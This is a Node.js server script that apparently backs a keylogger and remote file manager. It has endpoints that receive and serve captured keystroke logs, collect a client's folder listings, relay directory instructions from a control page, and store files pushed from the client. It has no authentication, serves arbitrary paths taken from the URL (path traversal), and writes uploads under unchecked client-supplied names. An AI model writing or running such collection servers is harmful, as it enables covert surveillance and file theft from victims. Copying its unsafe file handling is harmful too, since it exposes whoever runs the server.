//run 'node server.js' to run

const http = require('http');//needed for communication
const https = require('https');//needed for secure communication
const fs = require('fs');//read files
const path = require('path');
const formidable = require('formidable');
const port = 1999;//port for the server

let keylog = [];
let folders = { files: [], current_dir: [] };
let mediastream
let dirman_instruction = undefined;
let tempdetails = {}

//404 page goes here
function notfoundpage(res, url) {
    res.writeHead(404);//write head 404 so the client expects an error message
    res.write('404, code: ' + url);
    console.error('File not found: ', url)
}

///Create server
const server = http.createServer(function (req, res) {
    //What the webpage will expect ot receive, res = response, req = request

    //console.log('Request Url: ', req);
    //console.log('Raw rsponse: ',res)

    res.setHeader('Acess-Control-Allow-Origin', '*');//allow access control from client, this will automatically handle most media files

    switch (req.url) {
        case '/':
        case '/index.html'://requested url at the start of the site

            res.writeHead(200, { 'Content-type': 'text/html' });//200 ok
            fs.readFile('index.html', function (err, data) {//read index.html file
                if (err) {//error because file not found/inaccesible
                    notfoundpage(res, 'index');//show 404 page
                } else {//File read successful
                    res.write(data);//respond with data from file
                }
                res.end();//end response
            })

            break;

        case '/action/get/keylog'://send keylog to page

            //console.log('keylog request: ', keylog)
            res.writeHead(200, { 'Content-type': 'application/json' });//200 ok
            res.write(JSON.stringify(keylog))
            res.end()

            break;

        case '/action/post/keylog'://receive keylog from page

            req.on('data', function (data) {
                keylog = JSON.parse(data)
                //console.log('Keylog data :', keylog)
                res.end()
            });

            break;

        case '/action/get/folders'://Get folders from server

            //console.log('folder request: ', folders)
            res.writeHead(200, { 'Content-type': 'application/json' });//200 ok
            res.write(JSON.stringify(folders))
            res.end()

            break;

        case '/action/post/folders'://receive folders from page

            req.on('data', function (data) {
                folders = JSON.parse(data)
                //console.log('folder data :', folders)
                //respond with instruction
                res.writeHead(200, { 'Content-type': 'application/json' });//200 ok
                //console.log(dirman_instruction)
                if (dirman_instruction != undefined) {
                    res.end(JSON.stringify(dirman_instruction))
                } else {
                    res.end()
                }
                dirman_instruction = undefined;
            });

            break;

        case '/action/post/folders/instruct'://receive folder instructions from Control page

            req.on('data', function (data) {
                dirman_instruction = JSON.parse(data)
                console.log('folder instruction data :', dirman_instruction)
                res.writeHead(200, { 'Content-type': 'application/json' });//200 ok
                res.end(JSON.stringify({ server: 'instruction received' }))
            });

            break;

        case '/action/post/file/buffer'://receive folder instructions from Control page

            req.on('data', function (data) {
                //console.log('file buffer posted', data);
                /*var file = JSON.parse(data);*/
                console.log('File data :', data)
                console.log('writing to :', path.join('temp/', tempdetails.base));
                //try {//try to write rceived file
                try {
                    if (!fs.existsSync('temp/')) { fs.mkdirSync('temp/') }
                    fs.writeFile('temp/' + tempdetails.base, data, function (err) { if (err) { throw err; } })//write posted file 
                } catch (err) {
                    console.error(err)
                }
                //} catch (err) { console.error(err) }

                res.end();
            });

            break;

        case '/action/post/file/data'://receive file data instructions before file buffer is posted

            req.on('data', function (data) {
                //console.log('file buffer posted', data);
                tempdetails = JSON.parse(data);

                res.end();
            });

            break;

        case '/fileupload':

            var form = new formidable.IncomingForm();//Formidable file format
            form.parse(req, function (err, fields, files) {//parse data from the form
                //move file from default location to server
                fs.rename(files.filetoupload.path, path.join('temp/', files.filetoupload.name), function (err) {
                    if (err) console.log(err);
                    res.write('File uploaded and moved!');
                    res.end();
                });
            });

            break;

        default://Request is for component of webpage

            if (req.url.indexOf('.css') != -1) {//requested url is a css file
                res.setHeader('Content-type', 'text/css');//Set the header to css, so the client will expects a css document
            }
            else if (req.url.indexOf('.js') != -1) { //requested url is a js file
                res.setHeader('Content-type', 'application/javascript');//Set the header to javascript, so the client will expects a javascript document
            }
            else if (req.url.indexOf('.html') != -1) {//requested url is a html file
                res.setHeader('Content-type', 'text/html');//Set the header to html, so the client will expects a html document
            }
            else {
                //media handled automatically
            }

            fs.readFile(req.url.replace('/', ''), function (err, data) {//read req.url.replace('/', '') file
                if (err) {//error because file not found/inaccesible
                    notfoundpage(res, req.url);//show 404 page
                } else {
                    res.writeHead(200);//200 ok
                    res.write(data);//respond with data from file
                }
                res.end();//end response
            })

    }

}).listen(port, function (err) {//Listen to a port with server

    if (err) {
        console.error(err);
    } else {
        console.log('Listening on port: ', port);
    }

})
